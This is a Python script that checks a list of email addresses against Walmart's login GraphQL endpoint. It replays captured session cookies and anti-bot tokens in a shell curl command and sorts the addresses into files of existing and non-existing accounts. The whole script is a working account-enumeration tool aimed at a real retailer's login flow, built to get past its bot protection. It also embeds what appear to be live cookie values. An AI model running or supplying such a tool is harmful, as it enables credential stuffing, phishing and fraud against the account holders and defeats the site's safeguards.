# Open the file in read mode
import json
import time;
import subprocess

def append_to_file(file_name, text):
    with open(file_name, 'a') as file:
        file.write(text + '\n')

file_name = 'output.txt'
text_to_append = 'This is a new line.'

def get_curl_response(email):
    curl_command = (
        f"curl 'https://www.walmart.com/orchestra/idp/graphql' "
        "-H 'accept: application/json' "
        "-H 'accept-language: en-US' "
        "-H 'content-type: application/json' "
        "-H 'cookie: AID=wmlspartner%3D0%3Areflectorid%3D0000000000000000000000%3Alastupd%3D1716126391048; userAppVersion=us-web-1.137.0-0161cc14e3620ce43f6501ad89a87b8f2d1a8a69-051518; abqme=true; vtc=aw-ped6883eIDktCSvq5Bo; bstc=aw-ped6883eIDktCSvq5Bo; mobileweb=0; xpth=x-o-mart%2BB2C~x-o-mverified%2Bfalse; xpa=2g56D|3b28Q|6Cq5S|6h9D0|Btqnn|BxKa9|D2oRZ|DCD0C|DkbEy|FOs49|M-WkZ|M-t2I|MJ9xA|P4Rfd|SgmEs|Zy9Hv|aL6dB|c62ML|c9leR|fdm-7|g2kSe|hlWnX|mak4g|uFi1l|xNJLv|z4hOi; exp-ck=2g56D16h9D01Btqnn1BxKa91D2oRZ1DCD0C1M-WkZ1M-t2I1P4Rfd3Zy9Hv1aL6dB1c9leR1fdm-71g2kSe1hlWnX8mak4g1uFi1l1z4hOi1; _pxhd=d25bbe34d4f07f65868d7bf50d22d2ed6a507dbb97f97d1a4a516a092c504176:32be20ef-15e6-11ef-a35a-a73ee2675cec; xptwg=916798106:1226E3B948C3E40:2D6DD19:71A07590:ECD0D4A9:3802847F:; xptwj=qq:f0b34657ee3e26a36047:iqXqw2xkM6JzrXEqoJ3/KXczE8xXo0pePkFZ3h/7bPyo34FjHhviog2mwwPwgj7x62yFhTEvWC6b/opwePkC0wHO2MTF49PNyAZTIXJltWrGs8/tHMV08GH+9K4VjpSh+Fep2za8FUmHbRlpk6tt+RxoX+V4GNGBt6OBc6Fa; ak_bmsc=B36BCE56F09675C69F030AA50F30E4A3~000000000000000000000000000000~YAAQuDwSApVKhYaPAQAA7JwakRfezAd7gAJ4dK32dqLfYE6GndA42lYoFLAmgTu4V7dXxVU3fKF95O1zPp+GRyXztJaeAZtqMxKn3dpvD7oPsHbJVDL+MyftTD+zGSun7hgVS0+BBdMh+tp48G/oAoMWmTHY+nIJqt1OKtFiAbsMlPcfZis5iQ0mso9NLw5ACObopucLdHjc2Y4QaqCF2T3aBS91lx30noEGnwVb+yx4J7Tc1BPfwiVZg96fjWK8cvM28jhU8J0EKKATZkVjwFlPylPq9SXjFdHZQvXXa5PoQoqeRUtMpitEX3RDP611gZCO8fwg02GLPPpFWEJzR4efuQB1kZPjbsN57YlpujRExXXm+ph5DvNxGfqau2lKtKNmTOnsDEU=; TBV=7; com.wm.reflector=\"reflectorid:0000000000000000000000@lastupd:1716126393000@firstcreate:1716126391048\"; xpm=1%2B1716126390%2Baw-ped6883eIDktCSvq5Bo~%2B0; TS012768cf=01419f1d62ea25daf3e5f31b70810260e18c98f7bce4855a761b6e51ab5182b0d4c84dcb14d4517c0bb3903fa793323029451f0615; TS01a90220=01419f1d62ea25daf3e5f31b70810260e18c98f7bce4855a761b6e51ab5182b0d4c84dcb14d4517c0bb3903fa793323029451f0615; TS2a5e0c5c027=0820e3fdc4ab2000bc847d84606fbe25a979b1760c953c892a9dff15620c542f889a552c714c24860898540507113000ffcebeb49ffaf9bd3a8d8ec2b086d44a9e7be85632679ce0c06d93da4ad10bda574ddafa0ef46ff6cc5af4d4a9872374; bm_sv=0F2790C4B17F952B60BFEE05D30E1CEB~YAAQuDwSAsFKhYaPAQAAXaMakRfAtci9eCfRGaghv+A7ew91G3LRenp/jGSFDG4nJVU5jaOoilS1qd9crxEh2AjHE7Jo9osgI4GByKBk9XIJeh3JHxB9BomQBMpW9ioJZ0d90GhpXqlqGJdLEM+EW9McdiyNGSRS9kb2QVAGIfqwCpTZlE/nRt0iwzcMuA3JebjHaFlcCXfmtXA3/gWABAiHCxdt0S7fyZfCOtVi0W824s3k77qG0nJ8Xx27l39oUA==~1; pxcts=33f8dbc7-15e6-11ef-a2c8-87eb18d9e9a4; _pxvid=32be20ef-15e6-11ef-a35a-a73ee2675cec; _px3=5e0411dc50bef243c42914b00390997ece05d51335c04b1f532ab6116d1e5411:c6/Pz2/Q+rhWCImjMX+eQLoXVN8VpbnS/4EGHEW+Zrx0l/aW8Eyv7i0ajngaR3AOxE2ggm94vDkRMOhYBEPkrw==:1000:YIGH668AdBxJK65KhOWdDxToEvuOb0MJRZIZ0QdvVlJqhDXp+GnJVm8KnbabZ+K+jOwBqft8yDSOSz6FEviDs6F30EOjboKwyIzqBRvEjPhrmRSreNYZtGzMrmpixjRjisDUEFTEUStAXyz50YAgizOKK/pl+ehVFReBKr+Ol467cI1frzZ12fnNa92SsmNVgThx0cFsEUbJ0ll6Kam2NHGaibJ9URN4CB+sbZnN1BU=' "
        "-H 'device_profile_ref_id: 1n2daky7guxnv6b-8k43mw-kavop8ufnbmxa' "
        "-H 'downlink: 1.7' "
        "-H 'dpr: 1' "
        "-H 'origin: https://www.walmart.com' "
        "-H 'priority: u=1, i' "
        "-H 'referer: https://www.walmart.com/account/login?vid=oaoh&tid=0&returnUrl=%2F' "
        "-H 'sec-ch-ua: \"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"' "
        "-H 'sec-ch-ua-mobile: ?0' "
        "-H 'sec-ch-ua-platform: \"macOS\"' "
        "-H 'sec-fetch-dest: empty' "
        "-H 'sec-fetch-mode: cors' "
        "-H 'sec-fetch-site: same-origin' "
        "-H 'tenant-id: elh9ie' "
        "-H 'traceparent: 00-8d6df796a625d68ab608d8e1afb7efc1-c366b56aa100c62a-00' "
        "-H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36' "
        "-H 'wm_mp: true' "
        "-H 'wm_page_url: https://www.walmart.com/account/login?vid=oaoh&tid=0&returnUrl=%2F' "
        "-H 'wm_qos.correlation_id: 88_obeQk_0xffiotfBO_GDyzycCUnJyBbJ8N' "
        "-H 'x-apollo-operation-name: GetLoginOptions' "
        "-H 'x-enable-server-timing: 1' "
        "-H 'x-latency-trace: 1' "
        "-H 'x-o-bu: WALMART-US' "
        "-H 'x-o-ccm: server' "
        "-H 'x-o-correlation-id: 88_obeQk_0xffiotfBO_GDyzycCUnJyBbJ8N' "
        "-H 'x-o-gql-query: query GetLoginOptions' "
        "-H 'x-o-mart: B2C' "
        "-H 'x-o-platform: rweb' "
        "-H 'x-o-platform-version: us-web-1.137.0-0161cc14e3620ce43f6501ad89a87b8f2d1a8a69-051518' "
        "-H 'x-o-segment: oaoh' "
        f"--data-raw '{{\"query\":\"query GetLoginOptions($input:UserOptionsInput!){{getLoginOptions(input:$input){{loginOptions{{...LoginOptionsFragment}}authCode errors{{...LoginOptionsErrorFragment}}}}}}fragment LoginOptionsFragment on LoginOptions{{loginId loginIdType emailId phoneNumber{{number countryCode}}canUsePassword canUsePhoneOTP canUseEmailOTP loginPhoneLastFour loginMaskedEmailId signInPreference loginPreference lastLoginPreference hasRemainingFactors isPhoneConnected otherAccountsWithPhone loginMaskedEmailId hasPasskeyOnProfile}}fragment LoginOptionsErrorFragment on IdentityLoginOptionsError{{code message}}\",\"variables\":{{\"input\":{{\"loginId\":\"{email}\",\"loginIdType\":\"EMAIL\"}}}}}}'"
    )

    try:
        # Execute the curl command and capture the output
        response = subprocess.check_output(curl_command, shell=True, text=True)
        return response
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output}"
    
with open('emails.txt', 'r') as file:
    # Iterate over each line in the file
    for line in file:
        # Strip any leading/trailing whitespace characters (like newline characters)
        email = line.strip()
        # Print the email
        time.sleep(1)
        response = get_curl_response(email)
        jsonResponse = json.loads(response)
        print("Response", jsonResponse)
        if 'data' in jsonResponse:
            loginOptions = jsonResponse['data'].get('getLoginOptions')
            # Check if 'getLoginOptions' key exists
            if loginOptions:
                signInPreference = loginOptions.get('loginOptions', {}).get('signInPreference')
                if signInPreference == "CREATE":
                    append_to_file("not_exist.txt", email)
                # Do whatever you need to do with signInPreference
            else:
                print("'getLoginOptions' key not found in JSON response.")
                append_to_file("not_exist.txt", email)
        else:
            print("email exist ", email)
            append_to_file("exist.txt", email)